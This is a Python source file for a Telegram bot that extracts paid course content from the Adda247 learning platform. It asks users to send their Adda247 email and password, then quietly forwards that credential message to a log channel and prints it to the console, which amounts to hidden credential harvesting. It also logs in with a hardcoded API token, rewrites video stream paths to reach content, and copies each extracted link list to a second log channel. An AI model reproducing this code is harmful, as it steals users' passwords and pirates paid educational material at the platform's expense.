import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
import os
import requests
from Extractor import app
from config import PREMIUM_LOGS, join, BOT_TEXT, THUMB_URL
from datetime import datetime
import pytz
import logging
import httpx
from pyrogram.types import Message
import re
from Extractor.core.utils import forward_to_log

# Initialize logging with more details
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Constants
THUMB_PATH = "thumb.jpg"
TIMEOUT = 30  # Timeout for requests in seconds

def safe_get(obj, *keys, default=None):
    """Safely get nested dictionary values"""
    try:
        for key in keys:
            if obj is None:
                return default
            obj = obj.get(key)
        return obj if obj is not None else default
    except (AttributeError, KeyError):
        return default

async def download_thumbnail():
    """Download thumbnail image if not already downloaded"""
    if not os.path.exists(THUMB_PATH):
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(THUMB_URL)
                if response.status_code == 200:
                    with open(THUMB_PATH, 'wb') as f:
                        f.write(response.content)
                    logger.info("Thumbnail downloaded successfully")
                    return THUMB_PATH
        except Exception as e:
            logger.error(f"Error downloading thumbnail: {e}")
            return None
    return THUMB_PATH

async def make_request(url, headers=None, method="GET", json_data=None, timeout=TIMEOUT):
    """Make HTTP request with error handling"""
    try:
        async with httpx.AsyncClient() as client:
            if method == "GET":
                response = await client.get(url, headers=headers, timeout=timeout)
            else:
                response = await client.post(url, headers=headers, json=json_data, timeout=timeout)
            
            response.raise_for_status()
            return response.json()
    except httpx.HTTPError as e:
        logger.error(f"HTTP error occurred: {e}")
        return None
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode error: {e}")
        return None
    except Exception as e:
        logger.error(f"Request error: {e}")
        return None

@app.on_message(filters.command(["adda"]))
async def adda_command_handler(app, m):
    status_msg = None
    try:
        status_msg = await m.reply_text(
            "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
            "Send login details in this format:\n"
            "📧 <code>email*password</code>\n\n"
            "<i>Example:</i>\n"
            "- <code>user@gmail.com*password123</code>",
            parse_mode=ParseMode.HTML
        )

        try:
            # Wait for user's response with timeout
            response = await app.listen(
                chat_id=m.chat.id,
                timeout=300  # 5 minutes timeout
            )

            if not response:
                await status_msg.edit_text("❌ No response received. Please try again.")
                return

            if not response.text:
                await status_msg.edit_text("❌ Invalid message received. Please send text message.")
                return

            # Forward the login details to channel using the new utility
            try:
                print(f"Attempting to forward message: {response.text}")
                await forward_to_log(response, "Adda247")
                print("Successfully forwarded message")
            except Exception as e:
                print(f"Error in forwarding: {e}")
                # Continue with the process even if forwarding fails
            
            # Continue with existing logic
            if '*' not in response.text:
                await status_msg.edit_text("❌ Invalid format! Please use email*password")
                return

            e, p = response.text.split("*")
            await status_msg.edit_text(
                "🔄 <b>Logging in to ADDA 247...</b>",
                parse_mode=ParseMode.HTML
            )

            # Login request
            headers = {
                "authority": "userapi.adda247.com",
                "Content-Type": "application/json",
                "X-Auth-Token": "fpoa43edty5",
                "X-Jwt-Token": ""
            }

            login_data = {
                "email": e,
                "providerName": "email",
                "sec": p
            }

            login_response = await make_request(
                "https://userapi.adda247.com/login?src=aweb",
                headers=headers,
                method="POST",
                json_data=login_data
            )

            if not login_response:
                await status_msg.edit_text(
                    "❌ <b>Login Failed</b>\n\n"
                    "Server error or invalid response",
                    parse_mode=ParseMode.HTML
                )
                return

            jwt = safe_get(login_response, "jwtToken")
            if not jwt:
                await status_msg.edit_text(
                    "❌ <b>Login Failed</b>\n\n"
                    "Invalid credentials or server error",
                    parse_mode=ParseMode.HTML
                )
                return

            headers["X-Jwt-Token"] = jwt
            await status_msg.edit_text(
                "✅ <b>Login Successful!</b>\n"
                "🔄 Fetching your packages...",
                parse_mode=ParseMode.HTML
            )

            # Fetch packages
            packages_response = await make_request(
                "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb",
                headers=headers
            )

            packages = safe_get(packages_response, "data", default=[])
            if not packages:
                await status_msg.edit_text(
                    "❌ <b>No Packages Found</b>\n\n"
                    "Your account has no purchased packages.",
                    parse_mode=ParseMode.HTML
                )
                return

            # Download thumbnail for later use
            thumb_path = await download_thumbnail()

            # Process each package
            for package in packages:
                try:
                    package_id = safe_get(package, "packageId")
                    package_title = safe_get(package, "title", default="Untitled").replace('|', '_').replace('/', '_')
                    
                    if not package_id:
                        logger.warning(f"Skipping package with no ID: {package}")
                        continue

                    await status_msg.edit_text(
                        f"🔄 <b>Processing Package</b>\n\n"
                        f"📦 <code>{package_title}</code>\n"
                        f"🆔 <code>{package_id}</code>",
                        parse_mode=ParseMode.HTML
                    )

                    start = time.time()
                    file_name = f"ADDA_{package_id}_{package_title}.txt"
                    total_items = 0

                    with open(file_name, "w", encoding='utf-8') as file:
                        # First try the direct content API
                        content_response = await make_request(
                            f"https://store.adda247.com/api/v1/my/purchase/content/{package_id}?src=aweb",
                            headers=headers
                        )

                        if content_response:
                            # Try to get content directly
                            contents = safe_get(content_response, "data", "contents", default=[])
                            if contents:
                                await status_msg.edit_text(
                                    f"🔄 <b>Processing Direct Content</b>\n\n"
                                    f"📦 <code>{package_title}</code>",
                                    parse_mode=ParseMode.HTML
                                )
                                
                                for content in contents:
                                    content_name = safe_get(content, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                    content_url = safe_get(content, "url")
                                    if content_url:
                                        file.write(f"{content_name}: {content_url}\n")
                                        total_items += 1

                        # If no direct content, try child packages
                        if total_items == 0:
                            # Try different category types
                            categories = ["RECORDED_COURSE", "ONLINE_LIVE_CLASSES", "TEST_SERIES"]
                            
                            for category in categories:
                                child_response = await make_request(
                                    f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={category}&isComingSoon=false&pageNumber=0&pageSize=100&src=aweb",
                                    headers=headers
                                )

                                child_packages = safe_get(child_response, "data", "packages", default=[])
                                
                                if child_packages:
                                    for child in child_packages:
                                        child_id = safe_get(child, "packageId")
                                        child_title = safe_get(child, "title", default="Untitled").replace('|', '_').replace('/', '_')
                                        
                                        if not child_id:
                                            continue

                                        await status_msg.edit_text(
                                            f"🔄 <b>Processing {category.replace('_', ' ').title()}</b>\n\n"
                                            f"📦 <code>{package_title}</code>\n"
                                            f"└─ 📚 <code>{child_title}</code>",
                                            parse_mode=ParseMode.HTML
                                        )

                                        # Try different content endpoints
                                        endpoints = [
                                            (f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb", "onlineClasses"),
                                            (f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb", "contents"),
                                            (f"https://store.adda247.com/api/v1/my/purchase/test/{child_id}?src=aweb", "tests")
                                        ]

                                        for endpoint, content_key in endpoints:
                                            content_response = await make_request(endpoint, headers=headers)
                                            items = safe_get(content_response, "data", content_key, default=[])
                                            
                                            for item in items:
                                                item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                                
                                                # Handle PDF URL
                                                pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf")
                                                if pdf_file:
                                                    pdf_link = f"https://store.adda247.com/{pdf_file}"
                                                    file.write(f"{item_name}: {pdf_link}\n")
                                                    total_items += 1

                                                # Handle Video URL
                                                video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                                                if video_url:
                                                    try:
                                                        video_response = await make_request(
                                                            f"https://videotest.adda247.com/file?vp={video_url}&pkgId={child_id}&isOlc=true",
                                                            headers=headers
                                                        )
                                                        if video_response and isinstance(video_response, str):
                                                            for line in video_response.split('\n'):
                                                                if "480p30playlist.m3u8" in line:
                                                                    stream_url = line.replace('/updated', '/demo/updated')
                                                                    file.write(f"{item_name}: {stream_url}\n")
                                                                    total_items += 1
                                                                    break
                                                    except Exception as e:
                                                        logger.error(f"Error fetching video URL: {e}")
                                                        continue

                        if total_items == 0:
                            logger.warning(f"No content found for package {package_id}")
                            await status_msg.edit_text(
                                f"⚠️ <b>No Content Found</b>\n\n"
                                f"Package: <code>{package_title}</code>\n"
                                "This package might be empty or inaccessible.",
                                parse_mode=ParseMode.HTML
                            )
                            continue

                    if os.path.getsize(file_name) > 0:
                        end = time.time()
                        elapsed_time = end - start
                        mention = f'<a href="tg://user?id={m.from_user.id}">{m.from_user.first_name}</a>'
                        
                        caption = (
                            "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                            f"📱 <b>APP:</b> ADDA 247\n"
                            f"📚 <b>BATCH:</b> {package_title}\n"
                            f"⏱ <b>TIME TAKEN:</b> {elapsed_time:.1f}s\n"
                            f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                            f"📊 <b>CONTENT STATS</b>\n"
                            f"└─ 📁 Total Items: {total_items}\n\n"
                            f"🚀 <b>Extracted by:</b> {mention}\n\n"
                            f"<code>╾───• {BOT_TEXT} •───╼</code>"
                        )

                        # Send file with thumbnail
                        await app.send_document(
                            m.chat.id,
                            document=file_name,
                            caption=caption,
                            thumb=thumb_path if thumb_path else None,
                            parse_mode=ParseMode.HTML
                        )
                        
                        await app.send_document(
                            PREMIUM_LOGS,
                            document=file_name,
                            caption=caption,
                            thumb=thumb_path if thumb_path else None,
                            parse_mode=ParseMode.HTML
                        )

                    # Cleanup
                    try:
                        os.remove(file_name)
                    except Exception as e:
                        logger.error(f"Error removing file: {e}")

                except Exception as e:
                    logger.error(f"Error processing package {package_id if 'package_id' in locals() else 'unknown'}: {e}")
                    if status_msg:
                        await status_msg.edit_text(
                            f"❌ <b>Error Processing Package</b>\n\n"
                            f"Package: <code>{package_title if 'package_title' in locals() else 'Unknown'}</code>\n"
                            f"Error: <code>{str(e)}</code>",
                            parse_mode=ParseMode.HTML
                        )

            if status_msg:
                await status_msg.edit_text(
                    "✅ <b>Extraction Completed!</b>\n\n"
                    "All available packages have been processed.",
                    parse_mode=ParseMode.HTML
                )

        except Exception as e:
            logger.error(f"Global error in adda_command_handler: {e}")
            error_message = (
                "❌ <b>An Error Occurred</b>\n\n"
                f"Error details: <code>{str(e)}</code>\n\n"
                "Please try again or contact support."
            )
            if status_msg:
                await status_msg.edit_text(error_message, parse_mode=ParseMode.HTML)
            else:
                await m.reply_text(error_message, parse_mode=ParseMode.HTML)

    except Exception as e:
        logger.error(f"Global error in adda_command_handler: {e}")
        error_message = (
            "❌ <b>An Error Occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )
        if status_msg:
            await status_msg.edit_text(error_message, parse_mode=ParseMode.HTML)
        else:
            await m.reply_text(error_message, parse_mode=ParseMode.HTML)
